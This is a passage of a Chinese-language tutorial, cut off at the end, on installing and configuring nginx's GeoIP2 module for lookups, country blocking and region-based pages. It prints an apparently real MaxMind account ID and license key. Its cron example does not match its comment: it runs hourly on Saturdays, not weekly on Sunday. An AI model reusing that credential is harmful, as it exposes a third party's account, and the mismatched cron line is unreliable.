libmaxminddb-dev mmdb-bin geoipupdate\n上面安装的软件包是：\n\nlibmaxminddb0 libmaxminddb-dev – MaxMind 地理定位数据库\n\nmmdb-bin – 二进制。从命令行调用的程序。使用此命令手动定位 IP。\n\ngeoipupdate – 帮助配置和更新 GeoIP2 &#x2F; GeoLite2 的软件包。\n\n\nngx_http_geoip2_module下载描述: 下载 ngx_http_geoip2_module 使用基于客户端 IP（默认）或特定变量（同时支持 IPv4 和 IPv6）的 maxmind geoip2 数据库中的值创建变量，该模块现在支持nginx流，并且可以以与http模块相同的方式使用。\n项目地址: https://github.com/leev/ngx_http_geoip2_module/下载构建:\nwget -c https:&#x2F;&#x2F;github.com&#x2F;leev&#x2F;ngx_http_geoip2_module&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;3.4.tar.gz -O &#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_http_geoip2_module-3.4.tar.gz\ntar -zxf ngx_http_geoip2_module-3.4.tar.gz &amp;&amp; ls ngx_http_geoip2_module-3.4&#x2F;\n  # config  LICENSE  ngx_http_geoip2_module.c  ngx_stream_geoip2_module.c  README.md\nGeoip2 模块语法语法示例：\n# HTTP\nhttp &#123;\n  ...\n  geoip2 &#x2F;etc&#x2F;maxmind-country.mmdb &#123;\n    auto_reload 5m;\n    $geoip2_data_country_code default&#x3D;US source&#x3D;$variable_with_ip country iso_code;\n &#125;\n&#125;\n\n# Stream\nstream &#123;\n  ...\n  geoip2 &#x2F;etc&#x2F;maxmind-country.mmdb &#123;\n    auto_reload 5m;\n    $geoip2_data_country_code default&#x3D;US source&#x3D;$remote_addr country iso_code;\n  &#125;\n  ...\n&#125;\n参数说明:\n\nauto_reload &lt;interval&gt;: 启用自动重新加载将使 nginx 以指定的时间间隔检查数据库的修改时间，如果发生更改则重新加载。\n\n$variable_name [default=&lt;value] [source=$variable_with_ip] path ...: 如果没有指定【default】参数，则如果未找到该变量将为空，如果没有指定【source】参数 $remote_addr 将用于执行查找。\n\n\nmmdblookup 命令描述: 在前面编译安装libmaxminddb库后，我们便可以使用 mmdblookup 工具，查找所需数据的路径（例如：国家&#x2F;地区名称），以JSON格式返回的，其中continent（洲） 、country (国家) 、registered_country（已注册的国家）对象包含了code/geoname_id/names键：\nGeoLite2-Country.mmdb 库只带有 country 相关数据样本输出\n$ mmdblookup --file .&#x2F;GeoLite2-Country.mmdb --ip 223.6.6.6\n&#123;\n  &quot;continent&quot;:\n    &#123;\n      &quot;code&quot;:\n        &quot;AS&quot; &lt;utf8_string&gt;\n      &quot;geoname_id&quot;:\n        6255147 &lt;uint32&gt;\n      &quot;names&quot;:\n        &#123;\n          &quot;de&quot;:\n            &quot;Asien&quot; &lt;utf8_string&gt;\n          &quot;en&quot;:\n            &quot;Asia&quot; &lt;utf8_string&gt;\n          &quot;es&quot;:\n            &quot;Asia&quot; &lt;utf8_string&gt;\n          &quot;fr&quot;:\n            &quot;Asie&quot; &lt;utf8_string&gt;\n          &quot;ja&quot;:\n            &quot;アジア&quot; &lt;utf8_string&gt;\n          &quot;pt-BR&quot;:\n            &quot;Ásia&quot; &lt;utf8_string&gt;\n          &quot;ru&quot;:\n            &quot;Азия&quot; &lt;utf8_string&gt;\n          &quot;zh-CN&quot;:\n            &quot;亚洲&quot; &lt;utf8_string&gt;\n        &#125;\n    &#125;\n  &quot;country&quot;:\n    &#123;\n      &quot;geoname_id&quot;:\n        1814991 &lt;uint32&gt;\n      &quot;iso_code&quot;:\n        &quot;CN&quot; &lt;utf8_string&gt;\n      &quot;names&quot;:\n        &#123;\n          &quot;de&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;en&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;es&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;fr&quot;:\n            &quot;Chine&quot; &lt;utf8_string&gt;\n          &quot;ja&quot;:\n            &quot;中国&quot; &lt;utf8_string&gt;\n          &quot;pt-BR&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;ru&quot;:\n            &quot;Китай&quot; &lt;utf8_string&gt;\n          &quot;zh-CN&quot;:\n            &quot;中国&quot; &lt;utf8_string&gt;\n        &#125;\n    &#125;\n  &quot;registered_country&quot;:\n    &#123;\n      &quot;geoname_id&quot;:\n        1814991 &lt;uint32&gt;\n      &quot;iso_code&quot;:\n        &quot;CN&quot; &lt;utf8_string&gt;\n      &quot;names&quot;:\n        &#123;\n          &quot;de&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;en&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;es&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;fr&quot;:\n            &quot;Chine&quot; &lt;utf8_string&gt;\n          &quot;ja&quot;:\n            &quot;中国&quot; &lt;utf8_string&gt;\n          &quot;pt-BR&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;ru&quot;:\n            &quot;Китай&quot; &lt;utf8_string&gt;\n          &quot;zh-CN&quot;:\n            &quot;中国&quot; &lt;utf8_string&gt;\n        &#125;\n    &#125;\n&#125;\nGeoLite2-City.mmdb 库带有 country City 相关数据样本输出 (一般推荐使用该库)\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6\n &#123;\n    &quot;city&quot;:\n      &#123;\n        &quot;geoname_id&quot;:\n          1808926 &lt;uint32&gt;\n        &quot;names&quot;:\n          &#123;\n            &quot;de&quot;:\n              &quot;Hangzhou&quot; &lt;utf8_string&gt;\n            &quot;en&quot;:\n              &quot;Hangzhou&quot; &lt;utf8_string&gt;\n            &quot;es&quot;:\n              &quot;Hangzhou&quot; &lt;utf8_string&gt;\n            &quot;fr&quot;:\n              &quot;Hangzhou&quot; &lt;utf8_string&gt;\n            &quot;ja&quot;:\n              &quot;杭州市&quot; &lt;utf8_string&gt;\n            &quot;pt-BR&quot;:\n              &quot;Hangzhou&quot; &lt;utf8_string&gt;\n            &quot;ru&quot;:\n              &quot;Ханчжоу&quot; &lt;utf8_string&gt;\n            &quot;zh-CN&quot;:\n              &quot;杭州&quot; &lt;utf8_string&gt;\n          &#125;\n      &#125;\n    &quot;continent&quot;:\n      &#123;\n        &quot;code&quot;:\n          &quot;AS&quot; &lt;utf8_string&gt;\n        &quot;geoname_id&quot;:\n          6255147 &lt;uint32&gt;\n        &quot;names&quot;:\n          &#123;\n            &quot;de&quot;:\n              &quot;Asien&quot; &lt;utf8_string&gt;\n            &quot;en&quot;:\n              &quot;Asia&quot; &lt;utf8_string&gt;\n            &quot;es&quot;:\n              &quot;Asia&quot; &lt;utf8_string&gt;\n            &quot;fr&quot;:\n              &quot;Asie&quot; &lt;utf8_string&gt;\n            &quot;ja&quot;:\n              &quot;アジア&quot; &lt;utf8_string&gt;\n            &quot;pt-BR&quot;:\n              &quot;Ásia&quot; &lt;utf8_string&gt;\n            &quot;ru&quot;:\n              &quot;Азия&quot; &lt;utf8_string&gt;\n            &quot;zh-CN&quot;:\n              &quot;亚洲&quot; &lt;utf8_string&gt;\n          &#125;\n      &#125;\n    &quot;country&quot;:\n      &#123;\n        &quot;geoname_id&quot;:\n          1814991 &lt;uint32&gt;\n        &quot;iso_code&quot;:\n          &quot;CN&quot; &lt;utf8_string&gt;\n        &quot;names&quot;:\n          &#123;\n            &quot;de&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;en&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;es&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;fr&quot;:\n              &quot;Chine&quot; &lt;utf8_string&gt;\n            &quot;ja&quot;:\n              &quot;中国&quot; &lt;utf8_string&gt;\n            &quot;pt-BR&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;ru&quot;:\n              &quot;Китай&quot; &lt;utf8_string&gt;\n            &quot;zh-CN&quot;:\n              &quot;中国&quot; &lt;utf8_string&gt;\n          &#125;\n      &#125;\n    &quot;location&quot;:\n      &#123;\n        &quot;accuracy_radius&quot;:\n          1000 &lt;uint16&gt;\n        &quot;latitude&quot;:\n          30.299400 &lt;double&gt;\n        &quot;longitude&quot;:\n          120.161200 &lt;double&gt;\n        &quot;time_zone&quot;:\n          &quot;Asia&#x2F;Shanghai&quot; &lt;utf8_string&gt;\n      &#125;\n    &quot;registered_country&quot;:\n      &#123;\n        &quot;geoname_id&quot;:\n          1814991 &lt;uint32&gt;\n        &quot;iso_code&quot;:\n          &quot;CN&quot; &lt;utf8_string&gt;\n        &quot;names&quot;:\n          &#123;\n            &quot;de&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;en&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;es&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;fr&quot;:\n              &quot;Chine&quot; &lt;utf8_string&gt;\n            &quot;ja&quot;:\n              &quot;中国&quot; &lt;utf8_string&gt;\n            &quot;pt-BR&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;ru&quot;:\n              &quot;Китай&quot; &lt;utf8_string&gt;\n            &quot;zh-CN&quot;:\n              &quot;中国&quot; &lt;utf8_string&gt;\n          &#125;\n      &#125;\n    &quot;subdivisions&quot;:\n      [\n        &#123;\n          &quot;geoname_id&quot;:\n            1784764 &lt;uint32&gt;\n          &quot;iso_code&quot;:\n            &quot;ZJ&quot; &lt;utf8_string&gt;\n          &quot;names&quot;:\n            &#123;\n              &quot;en&quot;:\n                &quot;Zhejiang&quot; &lt;utf8_string&gt;\n              &quot;fr&quot;:\n                &quot;Province de Zhejiang&quot; &lt;utf8_string&gt;\n              &quot;zh-CN&quot;:\n                &quot;浙江省&quot; &lt;utf8_string&gt;\n            &#125;\n        &#125;\n      ]\n  &#125;\nGeoLite2-Country.mmdb 与 GeoLite2-Country.mmdb 对比\n# - 国家 .&#x2F;GeoLite2-Country.mmdb 库\n# 如果此时我只想获取 country 的名称可以这样。\n$ mmdblookup --file .&#x2F;GeoLite2-Country.mmdb --ip 223.6.6.6 country names zh-CN\n  &quot;中国&quot; &lt;utf8_string&gt;\n# 当然如果你想获取国家的 iso_code 也是同样的。\n$ mmdblookup --file .&#x2F;GeoLite2-Country.mmdb --ip 223.6.6.6 country iso_code\n  &quot;CN&quot; &lt;utf8_string&gt;\n\n# - 国家、城市库 .&#x2F;GeoLite2-Country.mmdb 库\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 country names zh-CN\n  &quot;中国&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 country iso_code\n  &quot;CN&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 continent names zh-CN\n  &quot;亚洲&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 subdivisions 0 names zh-CN\n  &quot;浙江省&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 subdivisions 0 names iso_code\n  &quot;ZJ&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 city names zh-CN\n  &quot;杭州&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 location longitude # 经度  \n  120.161200 &lt;double&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 location latitude  # 纬度\n  30.299400  &lt;double&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 location time_zone # 时区\n  &quot;Asia&#x2F;Shanghai&quot; &lt;utf8_string&gt;\n上述的两个示例我们可以将其转换为 geoip2 模块定义的nginx变量\n# 如只需要国家信息建议使用该库\ngeoip2 &#x2F;usr&#x2F;local&#x2F;GeoIP2&#x2F;GeoLite2-Country.mmdb &#123;\n  $geoip2_data_country &quot;default&#x3D;China&quot; source&#x3D;$remote_addr country names en\n&#125;\n\n# 如需要获取国家以及省份信息建议使用该库，此处暂不演示使用，在后续实践中再进行介绍和使用。\ngeoip2 &#x2F;usr&#x2F;local&#x2F;GeoIP2&#x2F;GeoLite2-City.mmdb &#123;\n  $geoip2_data_country &quot;default&#x3D;中国&quot; source&#x3D;$remote_addr country names zh-CN;  # 中国\n  $geoip2_data_country_code country iso_code;                  # CN\n  $geoip2_data_country_continent continent names zh-CN;        # 亚洲\n  $geoip2_data_country_continent_code continent code;          # AS\n  $geoip2_data_province_name subdivisions 0 names zh-CN;       # 浙江省\n  $geoip2_data_province_isocode subdivisions 0 names iso_code; # &quot;ZJ&quot;\n  $geoip2_data_city city names zh-CN;                         # 杭州\n  $geoip2_data_city_longitude location longitude;              # 120.161200\n  $geoip2_data_city_latitude location latitude;                # 30.299400\n  $geoip2_data_city_time_zone location time_zone;             # &quot;Asia&#x2F;Shanghai&quot;\n&#125;\n温馨提示: 当请求来自受信任的地址时，将使用“X-Forwarded-For”请求标头字段中的地址, 并且设置 geoip2_proxy_recursive &lt; on | off &gt; 指令。\n\n如果递归搜索被禁用，那么将使用“X-Forwarded-For”中发送的最后一个地址，而不是与一个受信任地址匹配的原始客户端地址。\n\n如果启用了递归搜索，那么将使用“X-Forwarded-For”中发送的最后一个非信任地址，而不是与可信地址之一匹配的原始客户端地址。\n\n\n模块使用参考地址：https://github.com/leev/ngx_http_geoip2_module/#example-usage\nGeoip2 模块编译动态链接库描述: 有可能此时你通过源码编译方式安装 Nginx 了 ，那如何加入新的Nginx模块呢?\n答: 那就是重新编译 Nginx 即可，我们不需要执行make install重新安装 Nginx 具体操作如下所示。\n温馨提示: 如果你没有Nginx二进制安装环境，可以访问【运维实践-最新Nginx二进制构建编译lua-nginx-module动态链接Lua脚本访问Redis数据库读取静态资源隐式展现】文章，并按照其流程进行二进制编译构建Nginx当前最新的稳定版本 1.22.0\nStep 1.执行nginx -v获取原编译构建的参数。\nnginx version: nginx&#x2F;1.22.0\nbuilt by gcc 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)\nbuilt with OpenSSL 1.1.1q  5 Jul 2022\nTLS SNI support enabled\nconfigure arguments: --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx --with-pcre&#x3D;..&#x2F;pcre-8.45 ......  --with-ld-opt&#x3D;-Wl,--as-needed,-O1,--sort-common\n\nStep 2.此处补充一点，你完全可按照自身需求使用--add-module进行静态链接库安装，或者使用--add-dynamic-module进行动态链接库安装。\n# 动态链接库安装模块 （绝对或者相对路径）\n--add-dynamic-module&#x3D;..&#x2F;ngx_http_geoip2_module-3.4\n--add-dynamic-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_http_geoip2_module-3.4\n\n# 静态链接库生成模块\n--add-module&#x3D;..&#x2F;ngx_http_geoip2_module-3.4\n\n\nStep 3.将步骤1获取的参数加入到./configure, 并在末尾添加上--add-dynamic-module=/usr/local/src/ngx_http_geoip2_module-3.4, 以重新构建支持 geoip2 模块的 nginx 二进制文件。\ncd &#x2F;usr&#x2F;local&#x2F;src&#x2F;nginx-1.22.0&#x2F;\n\n# 预编译参数\n.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx --user&#x3D;nginx --group&#x3D;nginx --with-pcre&#x3D;..&#x2F;pcre-8.45 --with-zlib&#x3D;..&#x2F;zlib-1.2.12 --with-openssl&#x3D;..&#x2F;openssl-1.1.1q --sbin-path&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx --conf-path&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.conf --pid-path&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.pid --error-log-path&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log --http-log-path&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log --lock-path&#x3D;&#x2F;var&#x2F;run&#x2F;nginx.lock --modules-path&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules --http-client-body-temp-path&#x3D;&#x2F;var&#x2F;cache&#x2F;nginx&#x2F;client_temp --http-proxy-temp-path&#x3D;&#x2F;var&#x2F;cache&#x2F;nginx&#x2F;proxy_temp --http-fastcgi-temp-path&#x3D;&#x2F;var&#x2F;cache&#x2F;nginx&#x2F;fastcgi_temp --http-uwsgi-temp-path&#x3D;&#x2F;var&#x2F;cache&#x2F;nginx&#x2F;uwsgi_temp --http-scgi-temp-path&#x3D;&#x2F;var&#x2F;cache&#x2F;nginx&#x2F;scgi_temp --with-threads --with-http_sub_module --with-http_v2_module --with-http_auth_request_module --with-http_realip_module --with-http_secure_link_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_ssl_module --with-http_slice_module --with-http_stub_status_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-stream --with-stream_realip_module --with-stream_ssl_module --with-stream_ssl_preread_module --with-stream_geoip_module --with-mail --with-mail_ssl_module --with-http_addition_module --with-http_random_index_module --with-compat --with-file-aio --with-cc-opt&#x3D;&#39;-Os -fomit-frame-pointer -g&#39; --with-ld-opt&#x3D;-Wl,-rpath,&#x2F;usr&#x2F;local&#x2F;luajit&#x2F;lib,--as-needed,-O1,--sort-common --add-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_devel_kit-0.3.1 --add-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;lua-nginx-module-0.10.21 --add-dynamic-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;echo-nginx-module-0.62 --add-dynamic-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_http_geoip2_module-3.4\n\n# 编译构建\nmake\n\n# 编译后将会在objs目录生成动态链接库，我们需复制到 &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules\n$ ls objs&#x2F;*.so\n  objs&#x2F;ngx_http_geoip2_module.so  objs&#x2F;ngx_stream_geoip2_module.so\n$ cp -a objs&#x2F;*.so &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules\n$ ls &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules\nngx_http_echo_module.so  ngx_http_geoip2_module.so  ngx_stream_geoip2_module.so\n\n# 然后使用objs目录中生成的 nginx 二进制文件覆盖 &#x2F;usr&#x2F;sbin&#x2F;nginx\n$ cp -a objs&#x2F;nginx &#x2F;usr&#x2F;sbin&#x2F;nginx\n$ make upgrade \n\n# 最后执行此命令验证安装是否成功\nnginx -V\n\nGeoLite2 数据库下载描述: Nginx 的 ngx_*_geoip2_module 模块依赖于 GeoLite2 数据库, 免费的 GeoLite2 数据库可从 Maxminds 网站获得（需要注册），GeoLite2 数据库基于 IP 地址的数据库和 Web 服务，提供有关地理位置、人口统计和用户以及匿名者的数据。\n如果你想下载与更新 GeoLite2 数据库,您需要拥有 MaxMind 帐户 ID 和许可证密钥, 并且当我们在 nginx 中使用则该 GeoIP2 模块，在我们请求时Nginx时根据IP地址来识别来源国家城市，但是我们需要提前下载载该数据库.\n简单流程: 首先访问 Maxminds 官网，然后注册登陆到用户后台，创建并获取 License Key, 最后下载 GeoLite2 数据库该压缩包，里面包含的是二进制mmdb格式的库文件。\nMaxminds 官网地址: https://maxmind.comGeoIP2 Web 服务演示（每天25次限额）：https://www.maxmind.com/en/geoip2-precision-demo?ip_address=223.6.6.6Locate My IP Address : https://www.maxmind.com/en/locate-my-ip-address\n如果无法登录官网或者你不想注册登陆，也可以下载博主已经从官网下载好的 GeoIP2 数据库。\nGeoLite2 数据库自动更新描述: 为了保证数据库中国家与城市的准确性，我们需要设置cron定时任务来更新MaxMind提供的GeoLite2-Country.mmdb或者GeoLite2-City.mmdb数据库, 以保证其数据库保持最新。\n 操作流程\n\nStep 1.使用apt命令帮助配置和更新 GeoIP2 &#x2F; GeoLite2 的软件包。\napt install -y geoipupdate\n\nStep 2.使用文本编辑器打开并编辑位于 /etc/GeoIP.conf 的 MaxMind GeoIP conf 文件, 使用上述步骤获取的 AccountID 和 LicenseKey 字段信息填入其文件中, 之后便可执行进行地理位置数据库，操作后如下图所示\n\n\n$ tee &#x2F;etc&#x2F;GeoIP.conf &lt;&lt;&#39;EOF&#39;\nAccountID 696302\nLicenseKey ycm3xq02oE7QXMOw\nEditionIDs GeoLite2-Country GeoLite2-City\nDatabaseDirectory &#x2F;usr&#x2F;local&#x2F;GeoIP2\nEOF\n\nls -alh &#x2F;usr&#x2F;local&#x2F;GeoIP2  # 手动更新前\ngeoipupdate --stack-trace\nls -alh &#x2F;usr&#x2F;local&#x2F;GeoIP2  # 手动更新后\n\n\nStep 3.为了方便运维管理我们可以创建定时任务自动更新，提高工作效率。\n\n# 查询执行文件绝对路径\n$ which geoipupdate\n&#x2F;usr&#x2F;bin&#x2F;geoipupdate\n\n# 每周天的凌晨更新数据库\n$ crontab -e\n0 * * * 6 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;geoipupdate &gt; &#x2F;var&#x2F;log&#x2F;geoipupdate.log 2&gt;&amp;1\n官网更新参考地址: https://dev.maxmind.com/geoip/updating-databases?lang=en.\n0x02实践1.使用GeoIP2模块请求客户端的IP地址国家省份经纬度展示描述: 本次实践将根据请求者的国家显示中文或者英文的IP地址位置等相关信息在网页上，通过前面的学习，我们知道 geoip2 在检索有关 geoip 数据库的元数据时，其语法格式为 $variable_name metadata &lt;field&gt;,\n实践流程\n\nStep 1.编辑Nginx.conf主配置文件在 http 片段中，自定义定义访问日志格式后加入如下两个 geoip2 指令片段。http &#123;\n  .....\n  geoip2 &#x2F;usr&#x2F;local&#x2F;GeoIP2&#x2F;GeoLite2-Country.mmdb &#123;\n    # 启用自动重新加载将使 nginx 以指定的时间间隔检查数据库的修改时间，如果发生更改则重新加载。\n    auto_reload 7d;\n    $geoip2_country_code country names en;\n  &#125;\n  \n  geoip2 &#x2F;usr&#x2F;local&#x2F;GeoIP2&#x2F;GeoLite2-City.mmdb &#123;\n    # 中国IP访问都显示中文\n    $geoip2_data_country &quot;default&#x3D;中国&quot; source&#x3D;$remote_addr country names zh-CN;  # 中国\n    $geoip2_data_country_code country iso_code;                  # CN\n    $geoip2_data_country_continent continent names zh-CN;        # 亚洲\n    $geoip2_data_country_continent_code continent code;          # AS\n    $geoip2_data_province_name subdivisions 0 names zh-CN;       # 浙江省\n    $geoip2_data_province_isocode subdivisions 0 names iso_code; # &quot;ZJ&quot;\n    $geoip2_data_city city names zh-CN;                          # 杭州\n    $geoip2_data_city_longitude location longitude;              # 120.161200\n    $geoip2_data_city_latitude location latitude;                # 30.299400\n    $geoip2_data_city_time_zone location time_zone;              # &quot;Asia&#x2F;Shanghai&quot;\n  \n    # 中国以外的访问都是显示英文\n    $geoip2_data_country_en &quot;default&#x3D;United States&quot; source&#x3D;$remote_addr country names en;  # United States\n    $geoip2_data_country_code country iso_code;                     # US\n    $geoip2_data_country_continent_en continent names en;           # North America\n    $geoip2_data_country_continent_code continent code;             # NA\n    $geoip2_data_province_name_en subdivisions 0 names en;          # &quot;&quot;\n    $geoip2_data_province_isocode subdivisions 0 names iso_code;    # &quot;&quot;\n    $geoip2_data_city city names en;                                # 杭州\n    $geoip2_data_city_longitude location longitude;                 # 120.161200\n    $geoip2_data_city_latitude location latitude;                   # 30.299400\n    $geoip2_data_city_time_zone location time_zone;                 # &quot;Asia&#x2F;Shanghai&quot;\n  &#125;\n  ....\n  \n  map $geoip2_data_country_code $CN &#123;\n    CN yes;\n    TW yes;\n    HK yes;\n    MO yes;\n    default no;       \n  &#125;\n\n&#125;\nStep 2.同样编辑conf.d/demo.conf, 此处使用虚拟主机头(demo.weiyigeek.top)做演, 加入如下指令片段，其主要作用是根据区其地区，使用中英文显示请求者IP地理位置信息。$ vim conf.d&#x2F;demo.conf\nserver &#123;\n  ...\n  # 精准匹配\n  location &#x3D; &#x2F;api&#x2F;v1&#x2F;ip &#123;\n    # 当访问者IP来自 &#96;CN|TW|HK|MO&#96; 时将会以json的形式进行返回中文的IP地址信息。\n    if ( $geoip2_data_country_code ~* (CN|TW|HK|MO) )&#123;\n      rewrite (.*)  &#x2F;api&#x2F;v1&#x2F;ip&#x2F;cn last;\n    &#125;\n    rewrite (.*) &#x2F;api&#x2F;v1&#x2F;ip&#x2F;en last;\n  &#125;\n  \n  # 中文显示\n  location &#x2F;api&#x2F;v1&#x2F;ip&#x2F;cn &#123;\n    default_type application&#x2F;json;\n    return 200 &#39;&#123;&quot;ip&quot;:&quot;$remote_addr&quot;,&quot;country&quot;:&#123;&quot;name&quot;: &quot;$geoip2_data_country&quot;, &quot;iso_code&quot;:  &quot;$geoip2_data_country_code&quot;, &quot;continent&quot;: &quot;$geoip2_data_country_continent&quot;,&quot;continent_code&quot;: &quot;$geoip2_data_country_continent_code&quot;&#125;,&quot;province&quot;:&#123;&quot;name&quot;:&quot;$geoip2_data_province_name&quot;,&quot;iso_code&quot;:&quot;$geoip2_data_province_isocode&quot;&#125;,&quot;city&quot;:&#123;&quot;name&quot;:&quot;$geoip2_data_city&quot;,&quot;timezone&quot;:&quot;$geoip2_data_city_time_zone&quot;&#125;,&quot;location&quot;:&#123;&quot;longitude&quot;:&quot;$geoip2_data_city_longitude&quot;,&quot;latitude&quot;:&quot;$geoip2_data_city_latitude&quot;&#125;&#125;&#39;;\n  &#125;\n  \n  # 英文显示\n  location &#x2F;api&#x2F;v1&#x2F;ip&#x2F;en &#123;\n    default_type application&#x2F;json;\n    return 200 &#39;&#123;&quot;ip&quot;:&quot;$remote_addr&quot;,&quot;country&quot;:&#123;&quot;name&quot;: &quot;$geoip2_data_country_en&quot;, &quot;iso_code&quot;:  &quot;$geoip2_data_country_code&quot;, &quot;continent&quot;: &quot;$geoip2_data_country_continent_en&quot;,&quot;continent_code&quot;: &quot;$geoip2_data_country_continent_code&quot;&#125;,&quot;province&quot;:&#123;&quot;name&quot;:&quot;$geoip2_data_province_name_en&quot;,&quot;iso_code&quot;:&quot;$geoip2_data_province_isocode&quot;&#125;,&quot;city&quot;:&#123;&quot;name&quot;:&quot;$geoip2_data_city&quot;,&quot;timezone&quot;:&quot;$geoip2_data_city_time_zone&quot;&#125;,&quot;location&quot;:&#123;&quot;longitude&quot;:&quot;$geoip2_data_city_longitude&quot;,&quot;latitude&quot;:&quot;$geoip2_data_city_latitude&quot;&#125;&#125;&#39;;\n  &#125;\n  ....\n&#125;\nStep 3.配置 nginx 核验与重载 nginx 服务, 此处使用不同的网络使用浏览器进行访问https://demo.weiyigeek.top/api/v1/ip验证, 结果如下图所示:。nginx -t &amp;&amp; nginx -s reload\n\n\n2.使用GeoIP2模块静止某一国家地区的IP地址访问网站描述: 为了减少国外的攻击，我们可以将指定的地区IP访问进行放行，除此之外的全部拒绝。\n实际流程:\n\nStep 1.在 nginx.conf 中添加 map 指令并进行如下配置, 预定义了可以访问网站的地区。http &#123;\n\n....\n\nmap $geoip2_data_country_code $allow_visit &#123;  \n    CN yes;  \n    TW yes;  \n    HK yes;  \n    MO yes;  \n    default no;  \n\n&#125;\n\n....\n\n&#125;\n温馨提示:\n\n\nmap 指令是由ngx_http_map_module模块提供的,默认情况下安装 nginx 都会安装该模块.\n\nmap 的主要作用是’创建自定义变量’,通过使用 nginx 的’内置’变量,去’匹配’某些特定规则; 如果匹配成功则设置某个值给自定义变量,而这个’自定义变量’又可以’用作他用’。\n\n\n\nStep 2.在demo.conf配置文件中添加一个访问验证的示例。# 访问该页面如果$allow_visit变量不为yes则返回403页面,否则返回访问者的IP地区信息。\nlocation &#x2F;allow&#x2F;html &#123;\n  default_type text&#x2F;html;\n  if ($allow_visit !&#x3D; yes ) &#123;\n    return 403 &quot;IP [ $remote_addr ] 禁止访问! &lt;br&gt; $remote_addr - $geoip2_data_country - $geoip2_data_country_code - $geoip2_data_country_continent&quot;;\n  &#125; \n  return 200 &quot;欢迎IP为 [ $remote_addr ] 用户进行访问! &lt;br&gt; $remote_addr - $geoip2_data_country - $geoip2_data_country_code - $geoip2_data_country_continent&quot;;\n&#125;\nStep 3.同样修改完成后，我们需要针对nginx配置核验与重新加载配置 nginx -t &amp;&amp; nginx -s reload （PS: 后续将不再提示了，想必大家都聊熟于心了）, ，之后分别使用工具进行访问验证，结果如下所示。\n\n3.使用GeoIP2模块实现不同国家访问进入不同目录页面描述: 在某些时刻我们可能会对不同地区来源访问的客户展示不同的页面，例如国内我就显示中文的页面，而新加坡我就显示英文的页面，这样一来就更加人性化一点。\n示例演示在/usr/local/nginx/html目录中创建ch/en子目录，同时准备两个不同地区访问的测试页面:\n$ tree &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html  \n├── ch  \n│   └── index.html  \n├── en  \n│   └── index.html  \n  \n  \n\n$ cat ch&#x2F;index.html\n\n&lt;h1&gt;中文站点&lt;&#x2F;h1&gt;\n\n&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;blog.weiyigeek.top&quot; frameborder&#x3D;&quot;0&quot; width&#x3D;&quot;500&quot;&gt;&lt;&#x2F;iframe&gt;\nNginx 配置中使用GeoIP处理访问请求。\nhttp &#123;\n....\n  map $geoip2_data_country_code $lang_ch &#123;\n    CN yes;\n    TW yes;\n    HK yes;\n    MO yes;\n    default no;\n  &#125;\n....\n server &#123;\n    listen       80;\n    server_name  demo.weiyigeek.top;\n    location &#x2F; &#123;\n      set $rootpath html&#x2F;ch; # 关键点设置一个根目录变量。\n      if ($lang_ch &#x3D; no) &#123; \n        set $rootpath html&#x2F;en;\n      &#125;\n      add_header program-path $rootpath; # 